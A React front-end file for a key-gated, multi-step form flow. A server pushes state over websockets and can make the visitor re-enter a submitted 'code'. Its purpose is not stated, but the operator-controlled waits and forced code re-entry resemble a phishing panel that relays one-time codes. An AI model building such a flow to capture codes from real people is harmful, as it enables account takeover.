import { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate, useParams, useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import io from 'socket.io-client';
import './App.css';

// Components
import Form1 from './components/Form1';
import Form2 from './components/Form2';
import Loading from './components/Loading';
import Pending from './components/Pending';
import Error from './components/Error';

// Initialize socket connection
// Use the current host for the socket connection to work in both development and production
const socketUrl = window.location.hostname === 'localhost' 
  ? 'http://localhost:3000' 
  : window.location.origin;
const socket = io(socketUrl);

// KeyValidator component to handle the key in URL query
function KeyValidator() {
  const location = useLocation();
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const queryParams = new URLSearchParams(location.search);
    const key = queryParams.get('key');

    if (!key) {
      setError('No key provided');
      setLoading(false);
      return;
    }

    // Validate key with backend
    axios.get(`/api/validate-key/${key}`)
      .then(response => {
        if (response.data.valid) {
          navigate(`/${key}`);
        } else {
          setError('Invalid key');
          setLoading(false);
        }
      })
      .catch(err => {
        console.error('Error validating key:', err);
        setError('Error validating key');
        setLoading(false);
      });
  }, [location, navigate]);

  if (loading) return <Loading />;
  if (error) return <Error message={error} />;
  return null;
}

// Main flow component
function FormFlow() {
  const { key } = useParams();
  const [state, setState] = useState('loading');
  const [formData, setFormData] = useState({});
  const [loading, setLoading] = useState(true);

  // Initial state fetch
  useEffect(() => {
    if (!key) return;

    axios.get(`/api/status/${key}`)
      .then(response => {
        setState(response.data.state || 'form_1');
        setLoading(false);
      })
      .catch(err => {
        console.error('Error fetching status:', err);
        setState('error');
        setLoading(false);
      });

    // Listen for state updates via socket
    socket.emit('join', { key });
    socket.on('state_update', data => {
      if (data.key === key) {
        setState(data.state);
      }
    });

    return () => {
      socket.off('state_update');
      socket.emit('leave', { key });
    };
  }, [key]);

  // Form 1 submission handler
  const handleForm1Submit = async (data) => {
    setLoading(true);
    try {
      await axios.post('/api/form', { key, ...data });
      setFormData({ ...formData, ...data });
      setState('loading');
    } catch (error) {
      console.error('Error submitting form:', error);
      setState('error');
    } finally {
      setLoading(false);
    }
  };

  // Code submission handler
  const handleCodeSubmit = async (code) => {
    setLoading(true);
    try {
      await axios.post('/api/code', { key, code });
      setFormData({ ...formData, code });
      setState('pending');
    } catch (error) {
      console.error('Error submitting code:', error);
      setState('reenter_code');
    } finally {
      setLoading(false);
    }
  };

  if (loading) return <Loading />;

  // Render the appropriate component based on current state
  switch (state) {
    case 'form_1':
      return <Form1 onSubmit={handleForm1Submit} />;
    case 'loading':
      return <Loading message="Please wait while we process your information..." />;
    case 'form_2':
      return <Form2 onSubmit={handleCodeSubmit} />;
    case 'reenter_code':
      return <Form2 onSubmit={handleCodeSubmit} error="Something went wrong. Please re-enter the code." />;
    case 'pending':
      return <Pending message="Your submission is being processed. Please wait..." />;
    case 'success':
      return <Pending message="Your submission was successful! Thank you." success={true} />;
    case 'error':
      return <Error />;
    default:
      return <Loading />;
  }
}

function App() {
  return (
    <Router>
      <Routes>
        <Route path="/" element={<KeyValidator />} />
        <Route path="/:key" element={<FormFlow />} />
        <Route path="*" element={<Navigate to="/" />} />
      </Routes>
    </Router>
  );
}

export default App;
